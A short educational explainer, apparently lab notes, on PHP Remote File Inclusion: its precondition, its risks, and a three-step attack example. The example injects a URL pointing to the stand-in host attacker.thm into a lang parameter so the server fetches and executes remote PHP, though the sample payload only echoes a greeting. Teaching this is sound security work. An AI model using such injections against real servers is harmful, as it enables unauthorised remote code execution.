# Remote File Inclusion (RFI)

Remote File Inclusion (RFI) is a technique used to include remote files into a vulnerable application. It occurs when user input is not properly sanitized, allowing an attacker to inject an external URL into an include function. For RFI to work, the `allow_url_fopen` option must be enabled.

RFI poses a higher risk than Local File Inclusion (LFI) as it can lead to Remote Command Execution (RCE) on the server. Other potential consequences include:

- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

## RFI Attack Steps

1. The attacker hosts a malicious PHP file on their server, e.g., `http://attacker.thm/cmd.txt` containing:
    ```php
    <?PHP echo "Hello THM"; ?>
    ```
2. The attacker injects a URL pointing to their server into the vulnerable web application, e.g., `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`.
3. If the input is not validated, the web application includes the remote file and executes its content, displaying the message "Hello THM".

An external server must communicate with the application server for a successful RFI attack, allowing the attacker to execute malicious code on the vulnerable server.
